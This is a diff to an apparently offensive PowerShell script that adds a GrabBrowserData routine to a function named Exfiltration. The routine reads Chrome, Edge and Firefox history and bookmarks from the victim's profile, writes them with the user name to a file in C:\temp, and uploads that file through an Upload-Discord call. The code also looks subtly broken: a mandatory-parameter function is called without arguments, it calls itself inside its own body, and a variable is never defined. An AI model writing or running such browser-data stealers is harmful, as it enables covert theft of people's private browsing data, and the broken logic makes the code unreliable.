@@ -72,6 +72,9 @@ function Exfiltration {
     #Call HardwareInfo
     HardwareInfo
 
+    #Call GrabBrowserData
+    GrabBrowserData
+
 
     
 }
@@ -479,6 +482,62 @@ $($networkAdapters | Format-Table | Out-String)
 }
 
 
+function GrabBrowserData {
+
+    [CmdletBinding()]
+    param (	
+        [Parameter(Position=1,Mandatory = $True)]
+        [string]$Browser,    
+        [Parameter(Position=2,Mandatory = $True)]
+        [string]$DataType 
+    ) 
+
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+
+    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    }
+    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+    }
+    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
+        $Path = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+    }
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+    }
+
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
+    $Value | ForEach-Object {
+        $Key = $_
+        if ($Key -match $Search){
+            New-Object -TypeName PSObject -Property @{
+                User = $env:UserName
+                Browser = $Browser
+                DataType = $DataType
+                Data = $_
+            }
+        }
+    } 
+
+
+# Travailler dans le répertoire C:\temp
+Set-Location -Path C:\temp
+
+# Appels à la fonction GrabBrowserData
+GrabBrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
+GrabBrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
+GrabBrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
+GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
+GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
+
+# Appel à la fonction Upload-Discord
+Upload-Discord -file "BrowserData.txt" -text "Browser Data:"
+
+}
 
 # Function to delete the temporary directory and create a zip archive
 function DelTempDir {
